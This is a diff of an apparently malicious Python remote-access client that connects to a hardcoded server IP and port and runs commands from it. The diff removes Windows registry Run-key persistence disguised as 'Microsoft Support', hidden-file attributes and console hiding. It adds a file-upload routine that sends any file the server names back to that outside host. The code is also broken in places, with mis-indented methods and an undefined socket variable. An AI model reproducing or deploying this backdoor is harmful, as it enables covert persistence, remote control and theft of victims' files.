@@ -5,16 +5,8 @@ import time
 import signal
 import sys
 import struct
-
-hiddenPath = os.getcwd()
-hiddenPath = '\"' + hiddenPath + '\"'
-regPath = os.getcwd()
-regPath = regPath + r"\%s"%Backdoor_Name
-regPath = '\"' + regPath + '\"'
-regConnect = ConnectRegistry(None, HKEY_LOCAL_MACHINE)
-regKey = OpenKey(regConnect, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
-SetValueEx(regKey,"Microsoft Support",0, REG_SZ, r"" + regPath)
-os.system("attrib +h " + hiddenPath)
+import coverage
+coverage.process_startup()
 
 class Client(object):
 
@@ -23,26 +15,6 @@ class Client(object):
         self.serverHost = '167.114.69.183'
         self.serverPort = 49153
         self.socket = None
-
-    def addStartup():  # this will add the file to the startup registry key
-    fp = os.path.dirname(os.path.realpath(__file__))
-    file_name = sys.argv[0].split('\\')[-1]
-    new_file_path = fp + '\\' + file_name
-    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
-    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
-    SetValueEx(key2change, 'systemclnr', 0, REG_SZ,
-               new_file_path)
-
-
-    def Hide():
-        import win32console
-        import win32gui
-        win = win32console.GetConsoleWindow()
-        win32gui.ShowWindow(win, 0)
-
-addStartup()
-
-Hide()
 
     def register_signal_handler(self):
         signal.signal(signal.SIGINT, self.quit_gracefully)
@@ -60,7 +32,6 @@ Hide()
                 # continue
         sys.exit(0)
         return
-
 
     def socket_create(self):
         """ Create a socket """
@@ -85,6 +56,16 @@ Hide()
             print("Cannot send hostname to server: " + str(e))
             raise
         return
+
+    def upload():
+        filename = s.recv(1024)
+        f = open(filename, 'rb')
+        i = f.read(1024)
+        while (i):
+            s.send(i)
+            i = f.read(1024)
+        f.close()
+        s.send("complete")
 
     def print_output(self, output_str):
         """ Prints command output """
@@ -114,6 +95,11 @@ Hide()
                     output_str = "Could not change directory: %s\n" %str(e)
                 else:
                     output_str = ""
+
+            elif str(data) == "download":
+                upload()
+                continue
+
             elif data[:].decode("utf-8") == 'quit':
                 self.socket.close()
                 break
